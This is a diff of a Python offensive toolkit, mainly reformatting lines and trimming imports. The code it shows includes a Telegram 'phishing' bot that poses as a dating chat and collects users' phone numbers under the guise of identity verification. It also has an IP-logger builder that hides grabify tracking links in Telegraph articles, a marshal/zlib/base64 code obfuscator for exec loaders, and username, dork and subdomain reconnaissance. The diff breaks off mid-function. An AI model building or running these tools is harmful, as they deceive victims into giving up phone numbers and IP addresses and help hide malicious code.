@@ -1,27 +1,19 @@
 import os
 import time
-import ctypes
-from ctypes import wintypes
 from datetime import datetime, timedelta
 import re
 import socket
-import subprocess
 import sys
-import json
 import requests
 from bs4 import BeautifulSoup
 import phonenumbers
 from phonenumbers import geocoder, carrier, timezone
 import whois
-import colorama
-from colorama import Fore, init
 from pystyle import Anime, Colors, Colorate, Center
 import base64
-import webbrowser
 import threading
 import string
 import random
-from requests.exceptions import RequestException
 import html
 from urllib.parse import urlparse, urljoin
 from tkinter import Tk
@@ -30,11 +22,8 @@ from telegraph import Telegraph, TelegraphException
 from random import choice
 from googlesearch import search
 import paketlib
-import pprint
 import zlib
-import base64
 import marshal
-import py_compile
 import urllib.request
 import telebot
 from telebot import types
@@ -43,15 +32,16 @@ import csv
 telegraph = Telegraph()
 telegraph.create_account(short_name='console_app')
 MAX_TITLE_LENGTH = 30
-zlb = lambda in_: zlib.compress(in_)
-b16 = lambda in_: base64.b16encode(in_)
-b32 = lambda in_: base64.b32encode(in_)
-b64 = lambda in_: base64.b64encode(in_)
-mar = lambda in_: marshal.dumps(compile(in_, '<x>', 'exec'))
+def zlb(in_): return zlib.compress(in_)
+def b16(in_): return base64.b16encode(in_)
+def b32(in_): return base64.b32encode(in_)
+def b64(in_): return base64.b64encode(in_)
+def mar(in_): return marshal.dumps(compile(in_, '<x>', 'exec'))
 
 
 def phishing():
-    token_bot = input(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter Bot token → ')
+    token_bot = input(
+        f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter Bot token → ')
     print(
         f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Good! Phising Bot done. You can use your bot.')
 
@@ -69,14 +59,17 @@ def phishing():
                              "👋 Приветствую! Теперь вы можете приступить к поиску знакомств! 😋\nОтправьте команду /search чтобы начать.")
         else:
             markup = types.InlineKeyboardMarkup()
-            markup.add(types.InlineKeyboardButton(text='✅ Подтвердить личность', callback_data='verify'))
+            markup.add(types.InlineKeyboardButton(
+                text='✅ Подтвердить личность', callback_data='verify'))
             bot.send_message(message.chat.id, "👋 Приветствую! Для начала подтвердите свою личность.",
                              reply_markup=markup)
 
     @bot.callback_query_handler(func=lambda call: call.data == 'verify')
     def verify_handler(call):
-        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-        button_contact = types.KeyboardButton(text="📱 Отправить контакт", request_contact=True)
+        markup = types.ReplyKeyboardMarkup(
+            one_time_keyboard=True, resize_keyboard=True)
+        button_contact = types.KeyboardButton(
+            text="📱 Отправить контакт", request_contact=True)
         markup.add(button_contact)
         bot.send_message(call.message.chat.id, "📞 Пожалуйста, подтвердите свою личность, отправив свой контакт.",
                          reply_markup=markup)
@@ -84,7 +77,8 @@ def phishing():
     @bot.message_handler(content_types=['text'])
     def text_handler(message):
         if message.chat.id not in verified_users:
-            bot.send_message(message.chat.id, "❌ Подтвердите личность, чтобы использовать команду. ❌")
+            bot.send_message(
+                message.chat.id, "❌ Подтвердите личность, чтобы использовать команду. ❌")
             return
         if message.text == '/search':
             waiting_users.append(message.chat.id)
@@ -94,8 +88,10 @@ def phishing():
                 user2 = waiting_users.pop(0)
                 chatting_users[user1] = user2
                 chatting_users[user2] = user1
-                bot.send_message(user1, "🎉 Собеседник найден! Начните с ним диалог.")
-                bot.send_message(user2, "🎉 Собеседник найден! Начните с ним диалог.")
+                bot.send_message(
+                    user1, "🎉 Собеседник найден! Начните с ним диалог.")
+                bot.send_message(
+                    user2, "🎉 Собеседник найден! Начните с ним диалог.")
         elif message.text == '/stop':
             if message.chat.id in chatting_users:
                 partner_id = chatting_users[message.chat.id]
@@ -125,9 +121,11 @@ def phishing():
         file_info = bot.get_file(message.document.file_id)
         if file_info.file_path.endswith('.exe') or file_info.file_path.endswith('.apk'):
             bot.delete_message(message.chat.id, message.message_id)
-            bot.send_message(message.chat.id, "🚫 Извините, файлы .exe и .apk запрещены.")
+            bot.send_message(
+                message.chat.id, "🚫 Извините, файлы .exe и .apk запрещены.")
 
     bot.polling()
+
 
 def web_crawler():
     def get_page_internet(url):
@@ -135,7 +133,8 @@ def web_crawler():
             response = urllib.request.urlopen(url)
             return response.read().decode('utf-8')
         except Exception as e:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error accessing {url}: {e}{Color.RESET}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error accessing {url}: {e}{Color.RESET}")
             return ""
 
     def get_next_target(page):
@@ -164,7 +163,8 @@ def web_crawler():
         while tocrawl and len(crawled) < max_pages:
             url = tocrawl.pop()
             if url not in crawled:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Crawling: {url}{Color.RESET}")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Crawling: {url}{Color.RESET}")
                 content = get_page_internet(url)
                 if content:
                     links = get_all_links(content)
@@ -172,28 +172,37 @@ def web_crawler():
                 crawled.append(url)
         return crawled
 
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Simple Web Crawler")
-    seed = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Enter the seed URL: {Color.RESET}").strip()
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Simple Web Crawler")
+    seed = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Enter the seed URL: {Color.RESET}").strip()
     try:
-        max_pages = int(input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Enter the maximum number of pages to crawl: {Color.RESET}").strip())
+        max_pages = int(input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Enter the maximum number of pages to crawl: {Color.RESET}").strip())
     except ValueError:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid number. Using default value of 5.{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid number. Using default value of 5.{Color.RESET}")
         max_pages = 5
 
     crawled_pages = crawl_web(seed, max_pages)
-    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Crawled Pages:{Color.RESET}")
+    print(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Crawled Pages:{Color.RESET}")
     for page in crawled_pages:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} {page}{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} {page}{Color.RESET}")
+
 
 def obfuscate_file(file_path, method):
     try:
         with open(file_path, 'r', encoding='utf-8') as file:
             original_code = file.read()
     except FileNotFoundError:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File not found!{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File not found!{Color.RESET}")
         return
     except UnicodeDecodeError:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Unable to decode file. Ensure UTF-8 encoding.{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Unable to decode file. Ensure UTF-8 encoding.{Color.RESET}")
         return
 
     try:
@@ -203,41 +212,57 @@ def obfuscate_file(file_path, method):
             zlib_data = zlib.compress(original_code.encode('utf-8'))
             obfuscated_code = f"import zlib;exec(zlib.decompress({repr(zlib_data)}).decode('utf-8'))"
         elif method == 3:
-            zlib_data = zlib.compress(marshal.dumps(compile(original_code, '<string>', 'exec')))
+            zlib_data = zlib.compress(marshal.dumps(
+                compile(original_code, '<string>', 'exec')))
             base64_data = base64.b64encode(zlib_data)
             obfuscated_code = f"import marshal, zlib, base64;exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64_data)}))))"
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid obfuscation method.{Color.RESET}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid obfuscation method.{Color.RESET}")
             return
     except Exception as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error during obfuscation: {e}{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error during obfuscation: {e}{Color.RESET}")
         return
 
     output_file = file_path.replace('.py', f'_obfuscated_method{method}.py')
     try:
         with open(output_file, 'w', encoding='utf-8') as file:
             file.write(obfuscated_code)
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscation successful. Saved as {output_file}.{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscation successful. Saved as {output_file}.{Color.RESET}")
     except Exception as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error saving file: {e}{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error saving file: {e}{Color.RESET}")
+
 
 def obfuscate_tool():
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Python File Obfuscation Tool{Color.RESET}")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Marshal")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Zlib")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Marshal + Zlib + Base64")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using all methods")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}0{Color.DARK_GRAY}]{Color.LIGHT_RED} Exit{Color.RESET}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Python File Obfuscation Tool{Color.RESET}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Marshal")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Zlib")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Marshal + Zlib + Base64")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using all methods")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}0{Color.DARK_GRAY}]{Color.LIGHT_RED} Exit{Color.RESET}")
 
-    choice = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Select an option: {Color.RESET}").strip()
+    choice = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Select an option: {Color.RESET}").strip()
 
     if choice == "0":
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Exiting...{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Exiting...{Color.RESET}")
         return
 
-    file_path = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter the path to the Python file: {Color.RESET}").strip()
+    file_path = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter the path to the Python file: {Color.RESET}").strip()
     if not os.path.isfile(file_path):
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File does not exist. Please check the path and try again.{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File does not exist. Please check the path and try again.{Color.RESET}")
         return
     if choice == "1":
         obfuscate_file(file_path, method=1)
@@ -249,8 +274,8 @@ def obfuscate_tool():
         for method in range(1, 4):
             obfuscate_file(file_path, method=method)
     else:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid option. Please select a valid choice.{Color.RESET}")
-
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid option. Please select a valid choice.{Color.RESET}")
 
 
 def check_username():
@@ -355,29 +380,42 @@ def check_username():
         "aboutme": "https://about.me/{username}",
         "colourlovers": "https://www.colourlovers.com/love/{username}"
     }
-    username = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter a username to check: {Color.RESET}")
+    username = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter a username to check: {Color.RESET}")
     for platform in platforms_list:
         try:
             url = urls.get(platform).format(username=username)
             response = requests.get(url, headers=headers, timeout=0.5)
             if response.status_code == 200:
-                print(f"{Color.GREEN}{platform.capitalize()}: {url} - User found.{Color.RESET}")
+                print(
+                    f"{Color.GREEN}{platform.capitalize()}: {url} - User found.{Color.RESET}")
             elif response.status_code == 404:
-                print(f"{Color.RED}{platform.capitalize()}: {url} - User not found.{Color.RESET}")
+                print(
+                    f"{Color.RED}{platform.capitalize()}: {url} - User not found.{Color.RESET}")
             else:
-                print(f"{Color.YELLOW}{platform.capitalize()}: {url} - Error {response.status_code}.{Color.RESET}")
+                print(
+                    f"{Color.YELLOW}{platform.capitalize()}: {url} - Error {response.status_code}.{Color.RESET}")
         except Exception:
-            print(f"{Color.BLUE}{platform.capitalize()}: Skipped due to an error.{Color.RESET}")
+            print(
+                f"{Color.BLUE}{platform.capitalize()}: Skipped due to an error.{Color.RESET}")
+
 
 def telegram_search():
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Telegram Search Tool")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Username")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Channel")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Chat")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Parse Telegram Channel")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}0{Color.DARK_GRAY}]{Color.LIGHT_RED} Exit")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Telegram Search Tool")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Username")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Channel")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Chat")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Parse Telegram Channel")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}0{Color.DARK_GRAY}]{Color.LIGHT_RED} Exit")
 
-    choice = input(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Select an option: {Color.RESET}").strip()
+    choice = input(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Select an option: {Color.RESET}").strip()
 
     def format_result(result):
         if isinstance(result, dict):
@@ -394,57 +432,74 @@ def telegram_search():
                     color = Color.LIGHT_BLUE
                 elif key == "tg":
                     color = Color.LIGHT_GREEN
-                print(f"{Color.DARK_GRAY}[{color}{label}{Color.DARK_GRAY}]: {Color.WHITE}{value}{Color.RESET}")
+                print(
+                    f"{Color.DARK_GRAY}[{color}{label}{Color.DARK_GRAY}]: {Color.WHITE}{value}{Color.RESET}")
         elif isinstance(result, list):
             for idx, item in enumerate(result, 1):
-                print(f"{Color.DARK_GRAY}[{Color.LIGHT_GREEN}Item {idx}{Color.DARK_GRAY}]: {Color.WHITE}{item}{Color.RESET}")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.LIGHT_GREEN}Item {idx}{Color.DARK_GRAY}]: {Color.WHITE}{item}{Color.RESET}")
         else:
             print(f"{Color.LIGHT_GREEN}{result}{Color.RESET}")
 
     if choice == "1":
-        username = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Username (e.g., @username): {Color.RESET}").strip()
+        username = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Username (e.g., @username): {Color.RESET}").strip()
         if username:
             result = paketlib.search.Telegram().TelegramUsername(username)
-            print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Username Search Result:{Color.RESET}")
+            print(
+                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Username Search Result:{Color.RESET}")
             format_result(result)
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Username cannot be empty.{Color.RESET}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Username cannot be empty.{Color.RESET}")
 
     elif choice == "2":
-        channel = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Channel (e.g., @channel): {Color.RESET}").strip()
+        channel = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Channel (e.g., @channel): {Color.RESET}").strip()
         if channel:
             result = paketlib.search.Telegram().TelegramChannel(channel)
-            print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Channel Search Result:{Color.RESET}")
+            print(
+                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Channel Search Result:{Color.RESET}")
             format_result(result)
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Channel cannot be empty.{Color.RESET}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Channel cannot be empty.{Color.RESET}")
 
     elif choice == "3":
-        chat = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Chat (e.g., @chat): {Color.RESET}").strip()
+        chat = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Chat (e.g., @chat): {Color.RESET}").strip()
         if chat:
             result = paketlib.search.Telegram().TelegramChat(chat)
-            print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Chat Search Result:{Color.RESET}")
+            print(
+                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Chat Search Result:{Color.RESET}")
             format_result(result)
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Chat cannot be empty.{Color.RESET}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Chat cannot be empty.{Color.RESET}")
 
     elif choice == "4":
-        channel = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Channel to Parse (e.g., @channel): {Color.RESET}").strip()
+        channel = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Channel to Parse (e.g., @channel): {Color.RESET}").strip()
         if channel:
             result = paketlib.search.Telegram().TelegramCParser(channel)
-            print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Parsed Channel Result:{Color.RESET}")
+            print(
+                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Parsed Channel Result:{Color.RESET}")
             format_result(result)
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Channel cannot be empty.{Color.RESET}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Channel cannot be empty.{Color.RESET}")
 
     elif choice == "0":
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Exiting...{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Exiting...{Color.RESET}")
         return
 
     else:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid option. Please select a valid choice.{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid option. Please select a valid choice.{Color.RESET}")
 
-    input(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Press Enter to continue...{Color.RESET}")
+    input(
+        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Press Enter to continue...{Color.RESET}")
 
 
 def generate_user_agent():
@@ -474,7 +529,8 @@ def generate_user_agent():
 
 
 def google_osint():
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Google OSINT Search")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Google OSINT Search")
     print(
         f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter a Google Dork query to refine your search.")
 
@@ -522,24 +578,31 @@ def google_osint():
         print(
             f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} An error occurred: {e}{Color.RESET}")
 
+
 def logger_ip():
     while True:
-        print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Main Menu")
+        print(
+            f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Main Menu")
         print(f"{Color.LIGHT_GREEN}1. Create an article{Color.RESET}")
         print(f"{Color.LIGHT_GREEN}2. FAQ{Color.RESET}")
         print(f"{Color.LIGHT_GREEN}3. Exit{Color.RESET}")
-        choice = input(f"{Color.LIGHT_BLUE}Choose an option: {Color.RESET}").strip()
+        choice = input(
+            f"{Color.LIGHT_BLUE}Choose an option: {Color.RESET}").strip()
 
         if choice == '1':
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Creating an article...")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Creating an article...")
             while True:
-                title = input(f"{Color.LIGHT_BLUE}Enter the article title (up to 30 characters): {Color.RESET}").strip()
+                title = input(
+                    f"{Color.LIGHT_BLUE}Enter the article title (up to 30 characters): {Color.RESET}").strip()
                 if len(title) > MAX_TITLE_LENGTH:
-                    print(f"{Color.DARK_RED}The title is too long. Please try again.{Color.RESET}")
+                    print(
+                        f"{Color.DARK_RED}The title is too long. Please try again.{Color.RESET}")
                     continue
                 break
 
-            content = input(f"{Color.LIGHT_BLUE}Enter the article content: {Color.RESET}").strip()
+            content = input(
+                f"{Color.LIGHT_BLUE}Enter the article content: {Color.RESET}").strip()
 
             while True:
                 link = input(
@@ -558,7 +621,8 @@ def logger_ip():
                         raise ValueError
                     break
                 except ValueError:
-                    print(f"{Color.DARK_RED}Please enter a valid positive number.{Color.RESET}")
+                    print(
+                        f"{Color.DARK_RED}Please enter a valid positive number.{Color.RESET}")
 
             full_content = f"<p>{content}</p>"
             for _ in range(num_links):
@@ -573,12 +637,14 @@ def logger_ip():
                     print(
                         f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Article created! Link: {response['url']}{Color.RESET}")
                 else:
-                    print(f"{Color.DARK_RED}Error while creating the article.{Color.RESET}")
+                    print(
+                        f"{Color.DARK_RED}Error while creating the article.{Color.RESET}")
             except TelegraphException as e:
                 print(f"{Color.DARK_RED}Telegraph API error: {e}{Color.RESET}")
 
         elif choice == '2':
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} FAQ...")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} FAQ...")
             print(
                 f"{Color.LIGHT_GREEN}Create a logger link at grabify.link. Ensure it ends with .png or .jpg.{Color.RESET}")
             print(
@@ -591,8 +657,10 @@ def logger_ip():
         else:
             print(f"{Color.DARK_RED}Invalid choice. Please try again.{Color.RESET}")
 
+
 def find_subdomains():
-    url = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter the target URL: ").strip()
+    url = input(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter the target URL: ").strip()
     subdomains = []
     try:
         response = requests.get(url)
@@ -609,21 +677,28 @@ def find_subdomains():
         subdomains = sorted(subdomains)
         if subdomains:
             for subdomain in subdomains:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.RESET} "  + subdomain)
-            save_choice = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Do you want to save the subdomains to a file? (yes/no): ").strip().lower()
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.RESET} " + subdomain)
+            save_choice = input(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Do you want to save the subdomains to a file? (yes/no): ").strip().lower()
             if save_choice == 'yes':
                 root = Tk()
                 root.withdraw()
-                file_name = asksaveasfilename(defaultextension=".txt", filetypes=[("laitoxx Text files", "*.txt")])
